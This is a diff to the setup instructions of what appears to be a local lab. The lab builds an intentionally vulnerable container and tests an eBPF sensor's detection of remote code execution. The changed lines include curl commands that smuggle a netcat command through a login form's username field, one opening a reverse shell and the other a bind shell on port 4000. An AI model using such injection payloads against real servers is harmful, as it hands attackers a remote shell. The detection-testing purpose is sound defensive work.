@@ -27,14 +27,15 @@ docker build -t rce-vuln-app .
 # Run the container (Run only in LAN!!!)
 docker run -d --rm\
   --name rce-target \
-  -p 8080:8080 \  # Web port for our web-server
+  -p 127.0.0.1:8080:8080 \  # Web port for our web-server
+  -p 127.0.0.1:4000:4000 \  # Remote shell port
   rce-vuln-app
 
 # Run the eBPF-sensor
 docker exec -it rce-target ./eBPF-hook.sh
 
-# Attack vunlnable server
-curl -X POST http://localhost:8080/ -d "username=; nc -e /bin/bash localhost <any port>;&password=test"
+# Attack vunlnable server (input don't shielded)
+curl -X POST http://localhost:8080/ -d "username=; nc -lvnp 4000 -e /bin/bash;&password=test"
 
 # Watch the output of eBPF-sensor
 ...
